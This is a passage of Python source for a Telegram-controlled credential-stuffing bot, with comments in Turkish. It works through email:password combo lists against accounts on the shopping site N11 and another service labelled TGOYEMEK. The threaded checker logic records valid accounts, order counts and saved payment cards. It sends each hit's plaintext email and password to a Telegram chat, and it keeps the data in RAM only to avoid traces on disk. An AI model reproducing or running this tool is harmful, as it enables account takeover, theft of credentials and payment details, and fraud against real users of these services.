        time.sleep(DELAY_PER_ACCOUNT)


def worker_pool(combos):
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(try_account, e, p) for e, p in combos]
        for _ in as_completed(futures):
            if STOP_EVENT.is_set():
                break


# -----------------------------
# N11 — TEK HESAP (RAM'e yazar)
# -----------------------------
def n11_try_account(email, password):
    attempt = 0
    while not STOP_EVENT.is_set():
        attempt += 1
        try:
            if not RATE_LIMITER.acquire():
                continue

            status, body, orders, order_count, card_status = n11_check_account(email, password)

            if status == "HIT":
                short, _ = n11_format_hit(email, password, body, orders, order_count, card_status)
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_hits"] += 1
                    STATS["n11_orders_total"] += int(order_count or 0)
                    if card_status:
                        STATS["n11_cards"] += 1
                    STATS["last_hit"] = f"N11 {email} @ {datetime.now().strftime('%H:%M:%S')}"
                with MEMORY_LOCK:
                    MEMORY_N11_HITS.append(short)
                print(Fore.GREEN + f"[N11 +] HIT: {email} | Sipariş: {order_count} | Kart: {card_status}")
                tg_send(
                    f"🎯 <b>N11 HIT</b>\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"📧 <code>{html.escape(email)}</code>\n"
                    f"🔑 <code>{html.escape(password)}</code>\n"
                    f"📦 Sipariş: <b>{order_count}</b>\n"
                    f"💳 {html.escape(short.split('|')[-1].strip())}"
                )
                return

            if status == "BAD":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_bad"] += 1
                print(Fore.RED + f"[N11 -] BAD: {email}")
                return

            if status == "SUSPENDED":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_susp"] += 1
                with MEMORY_LOCK:
                    MEMORY_N11_SUSP.append(f"{email}:{password}")
                print(Fore.YELLOW + f"[N11 ⚠] SUSPENDED: {email}")
                tg_send(
                    f"⚠️ <b>N11 SUSPENDED</b>\n"
                    f"📧 <code>{html.escape(email)}</code>\n"
                    f"🔑 <code>{html.escape(password)}</code>"
                )
                return

            if status == "LOCKED":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_locked"] += 1
                print(Fore.YELLOW + f"[N11 🔒] LOCKED: {email}")
                return

            with STATS_LOCK:
                STATS["n11_err"] += 1
                STATS["retried"] += 1
            if attempt >= MAX_PROXY_RETRY * 3:
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                print(Fore.YELLOW + f"[N11 !] {email} -> {status} (max retry)")
                return

        except Exception as e:
            print(Fore.YELLOW + f"[N11 !] {email} -> {e}")
            with STATS_LOCK:
                STATS["retried"] += 1


def n11_worker_pool(combos):
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(n11_try_account, e, p) for e, p in combos]
        for _ in as_completed(futures):
            if STOP_EVENT.is_set():
                break


# -----------------------------
# TELEGRAM DOSYA ÇEKME (Disk YOK, RAM)
# -----------------------------
def fetch_combo_from_telegram():
    tg_send(
        "📥 <b>Hangi checker?</b>\n"
        "<code>1</code> — TGOYEMEK\n"
        "<code>2</code> — N11\n"
        "Yaz, sonra <code>combo.txt</code> dosyasını gönder."
    )
    last_update_id = 0
    checker_choice = None
    while checker_choice is None:
        res = tg("getUpdates", offset=last_update_id + 1, timeout=30)
        if not res or not res.get("ok"):
            time.sleep(2)
            continue
        for upd in res["result"]:
            last_update_id = upd["update_id"]
            msg = upd.get("message") or upd.get("channel_post")
            if not msg:
                continue
            txt = (msg.get("text") or "").strip()
            if txt in ("1", "2"):
                checker_choice = txt
                tg_send(f"✅ Seçim: <b>{'TGOYEMEK' if txt=='1' else 'N11'}</b>\nŞimdi combo.txt gönder.")
                break

    print(Fore.CYAN + "[*] Telegram'dan combo dosyası bekleniyor...")
    while not STOP_EVENT.is_set():
        res = tg("getUpdates", offset=last_update_id + 1, timeout=30)
        if not res or not res.get("ok"):
            time.sleep(2)
            continue
        for upd in res["result"]:
            last_update_id = upd["update_id"]
            msg = upd.get("message") or upd.get("channel_post")
            if not msg:
                continue
            doc = msg.get("document")
            if not doc:
                continue
            file_id = doc["file_id"]
            file_name = doc.get("file_name", "combo.txt")
            fres = tg("getFile", file_id=file_id)
            if not fres or not fres.get("ok"):
                continue
            file_path = fres["result"]["file_path"]
            dl_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}"
            r = requests.get(dl_url, timeout=30)
            
            # DİSKE YAZMIYORUZ, DİREKT RAM'E OKUYORUZ
            raw_content = r.content.decode("utf-8", errors="ignore")
            combos = []
            for line in raw_content.splitlines():
                line = line.strip()
                if ":" not in line or not line:
                    continue
                e, p = line.split(":", 1)
                combos.append((e.strip(), p.strip()))
                
            tg_send(f"✅ <b>{file_name}</b> RAM'e alındı. ({len(combos)} hesap)")
            return combos, checker_choice


# -----------------------------
# ANA DÖNGÜ
# -----------------------------
def infinite_main():
    print(Fore.CYAN + "[*] Bot sonsuz modda başladı (PROXY YOK, 3sn/istek). Ctrl+C ile durdur.")

    threading.Thread(target=dashboard_updater, daemon=True).start()
    threading.Thread(target=callback_listener, daemon=True).start()

    while not STOP_EVENT.is_set():
        try:
            combos, checker_choice = fetch_combo_from_telegram()

            if not combos:
                tg_send("❌ Combo boş, yenisini gönder.")
                continue

            with STATS_LOCK:
                STATS["total"] = len(combos)
                STATS["checked"] = 0
                STATS["hits"] = 0
                STATS["bad"] = 0
                STATS["phone"] = 0
                STATS["errors"] = 0
                STATS["fails"] = 0
                STATS["retried"] = 0
                STATS["cards_found"] = 0
                STATS["start_time"] = time.time()
                STATS["running"] = True
                STATS["n11_checked"] = 0
                STATS["n11_hits"] = 0
                STATS["n11_bad"] = 0
                STATS["n11_susp"] = 0
                STATS["n11_locked"] = 0
                STATS["n11_err"] = 0
                STATS["n11_cards"] = 0
                STATS["n11_orders_total"] = 0
                STATS["active_checker"] = "TGOYEMEK" if checker_choice == "1" else "N11"

            tg_send(
                f"🚀 <b>Yeni iş başladı</b>\n"
                f"🎯 Checker: <b>{STATS['active_checker']}</b>\n"
                f"📦 Toplam: <b>{len(combos)}</b>\n"
                f"🧵 Thread: <b>{THREAD_COUNT}</b>\n"
                f"📡 Mod: <b>DIRECT (3sn/istek)</b>"
            )

            if checker_choice == "2":
                n11_worker_pool(combos)
            else:
                worker_pool(combos)

            with STATS_LOCK:
                STATS["running"] = False

            if checker_choice == "2":
                tg_send(
                    f"✅ <b>N11 iş bitti</b>\n"
                    f"🎯 Hit: <b>{STATS['n11_hits']}</b>\n"
                    f"💳 Kart: <b>{STATS['n11_cards']}</b>\n"
                    f"⚠️ Askı: <b>{STATS['n11_susp']}</b>\n"
                    f"🔒 Kilit: <b>{STATS['n11_locked']}</b>\n"
                    f"❌ Yanlış: <b>{STATS['n11_bad']}</b>\n"
                    f"🔁 Retry: <b>{STATS['retried']}</b>\n\n"
                    f"📥 <b>Yeni combo bekleniyor...</b>"
                )
            else:
                tg_send(
                    f"✅ <b>TGOYEMEK iş bitti</b>\n"
                    f"🎯 Hit: <b>{STATS['hits']}</b>\n"
                    f"💳 Kart: <b>{STATS['cards_found']}</b>\n"
                    f"📞 Telefon: <b>{STATS['phone']}</b>\n"
                    f"❌ Yanlış: <b>{STATS['bad']}</b>\n"
                    f"🔁 Retry: <b>{STATS['retried']}</b>\n\n"
                    f"📥 <b>Yeni combo bekleniyor...</b>"
                )

            time.sleep(2)

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Ctrl+C algılandı, durduruluyor...")
            STOP_EVENT.set()
            break
        except Exception as e:
            print(Fore.RED + f"[!] Ana döngü hatası: {e}")
            time.sleep(5)


# -----------------------------
# MAIN
# -----------------------------
def main():
    print(Fore.CYAN + "[*] Bot başlatılıyor (PROXY YOK, 3sn/istek)...")

    tg_send(
        "⚠️ <b>Proxy kapalı!</b>\n"
        "📡 Mod: <b>direct</b>\n"
        f"⏱ Hız: <b>{REQUEST_INTERVAL:.0f} saniyede 1 istek</b>\n"
        "💡 Storage yok, veriler sadece RAM'de ve Telegram'da."
    )

    infinite_main()

    print(Fore.CYAN + "\n[*] Bot kapatıldı.")


if __name__ == "__main__":
    main()